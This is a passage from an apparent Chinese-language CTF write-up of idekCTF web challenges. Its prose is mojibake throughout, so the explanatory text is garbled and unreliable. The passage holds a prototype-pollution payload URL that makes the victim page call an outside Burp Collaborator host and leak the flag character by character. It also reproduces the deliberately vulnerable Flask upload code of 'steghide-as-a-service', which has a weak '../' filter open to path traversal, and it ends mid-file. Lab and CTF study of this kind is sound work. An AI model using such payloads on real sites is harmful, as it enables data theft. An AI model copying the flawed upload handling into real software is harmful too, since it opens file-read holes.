&lt;p>è‚¥è‚ çš„é¸¡è´¼ï¼Œåœ¨fancy.htmlä¸­å¼•å…¥äº†ä¸€ä¸ªå¤–éƒ¨çš„jsè„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œè¿™ä¸ªarg.jsæ˜¯å­˜åœ¨jsåŽŸåž‹æ±¡æŸ“çš„æ´žå¹¶ä¸”æœ‰çŽ°æˆçš„POC-&amp;gt;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md&lt;/p>
&lt;p>è¿™ä¸å°±å¥½è¯´äº†ï¼Ÿ&lt;/p>
&lt;pre tabindex="0">&lt;code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;amp;__proto__[image]=x&amp;amp;__proto__[image]=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
&lt;/code>&lt;/pre>&lt;p>ä¹‹åŽåªéœ€è¦å¯¹qå‚æ•°çš„åŽé¢char-by-charåœ°ç›²æ³¨å³å¯&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://fireshellsecurity.team/idekctf-writeups/#fancy-notes">wp&lt;/a>&lt;/p>
&lt;h2 id="steghide-as-a-service">steghide-as-a-service&lt;/h2>
&lt;blockquote>
&lt;p>As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.&lt;/p>
&lt;p>&lt;a href="http://steghide-as-a-service.chal.idek.team/">http://steghide-as-a-service.chal.idek.team/&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip">https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>è·Ÿphpçš„ä¸ä¸€æ ·ï¼ˆä¸€èˆ¬è¦ç»•wafæ‹¿ä¸€ä¸ªwebshellï¼‰ï¼Œflaskçš„æ–‡ä»¶ä¸Šä¼ è€ƒç‚¹ä¸€èˆ¬åœ¨å…¶ä»–åœ°æ–¹ï¼Œæ¯”å¦‚ä¸€äº›tricks&amp;amp;SSTI&amp;amp;Cookieä¼ªé€ è¿™ç§çš„ï¼Œè¿™ä¸ªé¢˜ä¹Ÿä¸ä¾‹å¤–ï¼Œæ˜¯ä¸€ä¸ªLFI&lt;/p>
&lt;p>å…ˆå®¡ä¸€ä¸‹ä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">make_response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_file&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">imghdr&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">imghdr&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">util&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#75715e"># https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension&lt;/span>
&lt;span style="color:#75715e"># there are no bugs here. just patching imghdr&lt;/span>
&lt;span style="color:#111">JPEG_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xff\xd8\xff\xdb\x00&lt;/span>&lt;span style="color:#d88200">C&lt;/span>&lt;span style="color:#8045ff">\x00\x08\x06\x06&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> \
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_jpeg1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;JPEG data in JFIF format&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;JFIF&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_jpeg2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;JPEG with small header&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#ae81ff">67&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">JPEG_MARK&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_jpeg3&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;JPEG data in JFIF or Exif format&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;JFIF&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;Exif&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xff\xd8&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>
&lt;span style="color:#111">tests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test_jpeg1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test_jpeg2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test_jpeg3&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">verify_jpeg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">jpeg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Image&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">jpeg&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">imghdr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">what&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;MAX_CONTENT_LENGTH&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">make_response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;upload.html&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_cookie&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">create_token&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">resp&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/upload&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">upload&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">uploaded_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">upload_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uploaded_file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># no traversal!&lt;/span>
&lt;span style="color:#111">output_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">basename&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">upload_name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uploaded_file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">image_md5&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.jpeg&amp;#39;&lt;/span>
&lt;span style="color:#111">content_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;uploads/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">rand_string&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.txt&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># write temp txt file&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># write temp image file&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># verify jpeg validity&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">verify_jpeg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;File is not a valid JPEG!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#75715e"># verify session before using it&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">verify_token&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Session token invalid!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#75715e"># attempt to embed message in image&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">embed_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">image_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">output_name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Embedding failed!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#75715e"># append username to output path to prevent vulns&lt;/span>
&lt;span style="color:#111">sanitized_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">upload_name&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sanitized_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">rename&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">output_name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sanitized_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sanitized_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Something went wrong! Check your file name&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># util.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">PIL&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Image&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">jwt&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">imghdr&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#111">priv_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;keys/private.pem&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_token&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">priv_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;keys/private.pem&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
